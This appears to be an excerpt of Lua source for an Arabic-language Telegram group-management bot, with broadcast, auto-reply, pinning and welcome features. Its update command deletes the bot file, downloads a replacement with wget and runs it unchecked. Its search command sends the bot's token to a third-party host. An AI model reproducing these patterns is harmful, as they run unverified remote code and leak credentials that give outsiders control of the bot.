DevRio:del(Latvia.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevRio:smembers(Latvia..'Rio:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
...
DevRio:setex(Latvia.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Latvia.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Latvia.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevRio:smembers(Latvia..'Rio:Groups')   
for k,v in pairs(List) do  
...
DevRio:setex(Latvia.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Latvia.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Latvia.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevRio:smembers(Latvia..'Rio:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
...
DevRio:setex(Latvia.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Latvia.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Latvia.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevRio:smembers(Latvia.."Rio:Groups") 
if msg.content_.text_ then
...
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevRio:set(Latvia..'Rio:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
...
RioText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevRio:set(Latvia..'Rio:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
RioText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevRio:set(Latvia..'Rio:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
RioText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(Latvia..'Rio:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
RioText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(Latvia..'Rio:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
RioText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(Latvia..'Rio:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
RioText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevRio:set(Latvia..'Rio:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
RioText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevRio:set(Latvia..'Rio:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
...
if not Bot(msg) and DevRio:get(Latvia..'Rio:Lock:Rd'..msg.chat_id_) then 
...
local List = DevRio:smembers(Latvia..'Rio:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end end
DevRio:set(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevRio:get(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
if not DevRio:sismember(Latvia..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
...
DevRio:set(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevRio:set(Latvia..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
...
DevRio:set(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
...
DevRio:set(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRedod = DevRio:get(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
DevRio:set(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevRio:set(Latvia..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(Latvia..'Rio:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source Latvia     --
...
local List = DevRio:smembers(Latvia..'Rio:Manager:GpRed'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevRio:set(Latvia..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevRio:set(Latvia..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevRio:get(Latvia..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
...
DevRio:set(Latvia..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevRio:set(Latvia..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(Latvia..'Rio:Manager:GpRed'..msg.chat_id_,text)
DevRio:set(Latvia..'DelManagerRep'..msg.chat_id_,text)
return false
end end
--     Source Latvia     --
...
local List = DevRio:smembers(Latvia.."Rio:Sudo:AllRed")
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevRio:set(Latvia.."Rio:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevRio:set(Latvia.."Rio:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevRio:get(Latvia.."Rio:Add:AllRed"..msg.sender_user_id_)
...
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevRio:set(Latvia.."Rio:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevRio:set(Latvia.."Rio:Add:AllText"..msg.sender_user_id_, text)
DevRio:sadd(Latvia.."Rio:Sudo:AllRed",text)
DevRio:set(Latvia.."DelSudoRep",text)
return false 
end end
--     Source Latvia     --
...
local redod = DevRio:smembers(Latvia..'Rio:Manager:GpRedod'..msg.chat_id_)
MsgRep = '᥀︙قائمة الردود المتعدده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevRio:smembers(Latvia..'Rio:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
...
if not Bot(msg) and DevRio:get(Latvia..'Rio:Lock:GpRd'..msg.chat_id_) then 
...
for k,v in pairs(redod) do
DevRio:del(Latvia..'Rio:Text:GpTexts'..v..msg.chat_id_)
DevRio:del(Latvia..'Rio:Manager:GpRedod'..msg.chat_id_)
end
...
local redod = DevRio:smembers(Latvia..'Rio:Manager:GpRed'..msg.chat_id_)
MsgRep = '᥀︙ردود المدير ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevRio:get(Latvia.."Rio:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevRio:get(Latvia.."Rio:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevRio:get(Latvia.."Rio:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevRio:get(Latvia.."Rio:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevRio:get(Latvia.."Rio:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevRio:get(Latvia.."Rio:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevRio:get(Latvia.."Rio:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevRio:get(Latvia.."Rio:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
...
for k,v in pairs(redod) do
DevRio:del(Latvia..'Rio:Gif:GpRed'..v..msg.chat_id_)
DevRio:del(Latvia..'Rio:Voice:GpRed'..v..msg.chat_id_)
DevRio:del(Latvia..'Rio:Audio:GpRed'..v..msg.chat_id_)
DevRio:del(Latvia..'Rio:Photo:GpRed'..v..msg.chat_id_)
DevRio:del(Latvia..'Rio:Stecker:GpRed'..v..msg.chat_id_)
DevRio:del(Latvia..'Rio:Video:GpRed'..v..msg.chat_id_)
DevRio:del(Latvia..'Rio:File:GpRed'..v..msg.chat_id_)
DevRio:del(Latvia..'Rio:Text:GpRed'..v..msg.chat_id_)
DevRio:del(Latvia..'Rio:Manager:GpRed'..msg.chat_id_)
end
...
local redod = DevRio:smembers(Latvia.."Rio:Sudo:AllRed")
MsgRep = '᥀︙ردود المطور ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevRio:get(Latvia.."Rio:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevRio:get(Latvia.."Rio:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevRio:get(Latvia.."Rio:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevRio:get(Latvia.."Rio:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevRio:get(Latvia.."Rio:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevRio:get(Latvia.."Rio:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevRio:get(Latvia.."Rio:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevRio:get(Latvia.."Rio:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
...
for k,v in pairs(redod) do
DevRio:del(Latvia.."Rio:Add:AllRed"..v)
DevRio:del(Latvia.."Rio:Gif:AllRed"..v)
DevRio:del(Latvia.."Rio:Voice:AllRed"..v)
DevRio:del(Latvia.."Rio:Audio:AllRed"..v)
DevRio:del(Latvia.."Rio:Photo:AllRed"..v)
DevRio:del(Latvia.."Rio:Stecker:AllRed"..v)
DevRio:del(Latvia.."Rio:Video:AllRed"..v)
DevRio:del(Latvia.."Rio:File:AllRed"..v)
DevRio:del(Latvia.."Rio:Text:AllRed"..v)
DevRio:del(Latvia.."Rio:Sudo:AllRed")
end
...
DevRio:set(Latvia..'Rio:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
...
DevRio:set(Latvia..'Rio:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LatviaTeam =  DevRio:get(Latvia..'Rio:Help0'..msg.sender_user_id_)
if LatviaTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Latvia..'Rio:Help0'..msg.sender_user_id_)
DevRio:set(Latvia..'Rio:Help', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Latvia..'Rio:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LatviaTeam =  DevRio:get(Latvia..'Rio:Help01'..msg.sender_user_id_)
if LatviaTeam == 'msg' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Latvia..'Rio:Help01'..msg.sender_user_id_)
DevRio:set(Latvia..'Rio:Help1', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Latvia..'Rio:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LatviaTeam =  DevRio:get(Latvia..'Rio:Help21'..msg.sender_user_id_)
if LatviaTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Latvia..'Rio:Help21'..msg.sender_user_id_)
DevRio:set(Latvia..'Rio:Help2', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Latvia..'Rio:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LatviaTeam =  DevRio:get(Latvia..'Rio:Help31'..msg.sender_user_id_)
if LatviaTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Latvia..'Rio:Help31'..msg.sender_user_id_)
DevRio:set(Latvia..'Rio:Help3', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Latvia..'Rio:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LatviaTeam =  DevRio:get(Latvia..'Rio:Help41'..msg.sender_user_id_)
if LatviaTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Latvia..'Rio:Help41'..msg.sender_user_id_)
DevRio:set(Latvia..'Rio:Help4', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
DevRio:set(Latvia..'Rio:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LatviaTeam =  DevRio:get(Latvia..'Rio:Help51'..msg.sender_user_id_)
if LatviaTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Latvia..'Rio:Help51'..msg.sender_user_id_)
DevRio:set(Latvia..'Rio:Help5', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Latvia..'Rio:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LatviaTeam =  DevRio:get(Latvia..'Rio:Help61'..msg.sender_user_id_)
if LatviaTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Latvia..'Rio:Help61'..msg.sender_user_id_)
DevRio:set(Latvia..'Rio:Help6', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia.."Rio:WhyTube"..msg.chat_id_) 
return false  
end
if text == 'تعطيل اليوتيوب' and Manager(msg) then  
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل اليوتيوب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia.."Rio:WhyTube"..msg.chat_id_,true) 
return false  
end 
if text and text:match('^بحث (.*)$') and not DevRio:get(Latvia.."Rio:WhyTube"..msg.chat_id_) then            
local Text = text:match('^بحث (.*)$') 
local msg_id = msg.id_/2097152/0.5 
https.request('https://api-david.ml/Latvia/DavidYt.php?Put=Search&TokenBot='..TokenBot..'&ChatId='..msg.chat_id_..'&UserId='..msg.sender_user_id_..'&Text='..URL.escape(Text)..'&MsgId='..msg_id..'&Name='..DirName)
end
--     Source Latvia     --
if SecondSudo(msg) then
if text == "تحديث السورس" and ChCheck(msg) or text == "تحديث سورس" and ChCheck(msg) or text == "↫ تحديث السورس ᥀" and ChCheck(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙جاري تحديث سورس لاتفيا', 1, 'md') 
os.execute('rm -rf Latvia.lua') 
os.execute('wget https://raw.githubusercontent.com/Latvia-Team/Latvia/main/Latvia.lua') 
dofile('Latvia.lua') 
...
local Users = DevRio:smembers(Latvia.."User_Bot")
local Groups = DevRio:smembers(Latvia..'Chek:Groups')
local Sudos = DevRio:smembers(Latvia.."Sudo:User")
if DevRio:get(Latvia..'Name:Bot') then
DevRio:set(Latvia..'Rio:NameBot',(DevRio:get(Latvia..'Name:Bot') or 'لاتفيا'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
DevRio:sadd(Latvia..'Rio:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevRio:sadd(Latvia..'Rio:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevRio:sadd(Latvia..'Rio:Groups',Groups[i]) 
if DevRio:get(Latvia.."Private:Group:Link"..Groups[i]) then
DevRio:set(Latvia.."Rio:Groups:Links"..Groups[i],DevRio:get(Latvia.."Private:Group:Link"..Groups[i]))
end
if DevRio:get(Latvia.."Get:Welcome:Group"..Groups[i]) then
DevRio:set(Latvia..'Rio:Groups:Welcomes'..Groups[i],DevRio:get(Latvia.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevRio:smembers(Latvia..'Constructor'..Groups[i])
for k,v in pairs(list2) do
DevRio:sadd(Latvia.."Rio:Constructor:"..Groups[i], v)
end
local list3 = DevRio:smembers(Latvia..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevRio:sadd(Latvia.."Rio:BasicConstructor:"..Groups[i], v)
end
local list4 = DevRio:smembers(Latvia..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevRio:sadd(Latvia.."Rio:Managers:"..Groups[i], v)
end
local list5 = DevRio:smembers(Latvia..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevRio:sadd(Latvia.."Rio:Admins:"..Groups[i], v)
end
local list6 = DevRio:smembers(Latvia..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevRio:sadd(Latvia.."Rio:VipMem:"..Groups[i], v)
end
DevRio:set(Latvia.."Rio:Lock:Bots"..Groups[i],"del") DevRio:hset(Latvia.."Rio:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
...
for i,Lock in pairs(LockList) do
DevRio:set(Latvia..Lock..Groups[i],true)
end
end
...
DevRio:del(Latvia..'Rio:Text:BotWelcome')
DevRio:del(Latvia..'Rio:Photo:BotWelcome')
return false
end 
...
DevRio:del(Latvia..'Rio:Lock:BotWelcome')
return false
end 
...
DevRio:set(Latvia..'Rio:Lock:BotWelcome',true)
return false
end 
...
DevRio:del(Latvia..'Rio:Text:BotWelcome')
DevRio:del(Latvia..'Rio:Photo:BotWelcome')
DevRio:set(Latvia.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevRio:get(Latvia.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevRio:del(Latvia.."Rio:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ النص ارسل لي صورة الترحيب\n᥀︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevRio:set(Latvia.."Rio:Text:BotWelcome",text) 
DevRio:set(Latvia.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevRio:get(Latvia.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
...
DevRio:set(Latvia.."Rio:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
...
DevRio:setex(Latvia.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
...
DevRio:del(Latvia.."DevText")
end end
--     Source Latvia     --
if DevRio:get(Latvia.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevRio:del(Latvia.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del(Latvia.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevRio:set(Latvia..'Rio:ChText',texxt)
...
DevRio:setex(Latvia.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)   
...
Text = [[
᥀︙[قناة السورس](https://t.me/latviateam)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ قناة السورس',url="t.me/latviateam"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/latviateam&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
Text = [[
᥀︙[مبرمج السورس](https://t.me/opmni)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ مبرمج السورس',url="t.me/opmni"}},
}
local msg_id = msg.id_/2097152/0.5
...
DevRio:incr(Latvia..'Rio:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevRio:get(Latvia..'Rio:Lock:EditMsgs'..msg.chat_id_) and not Text and not RioConstructor(result) then
...
local GetMsgPin = DevRio:get(Latvia..'Rio:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevRio:del(Latvia..'Rio:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevRio:del(Latvia..'Rio:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
...
DevRio:srem(Latvia..'Rio:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevRio:srem(Latvia..'Rio:Groups',v)  
end
...
DevRio:sadd(Latvia..'Rio:Groups',v)  
end end,nil) end
end
--     Source Latvia     --
end 
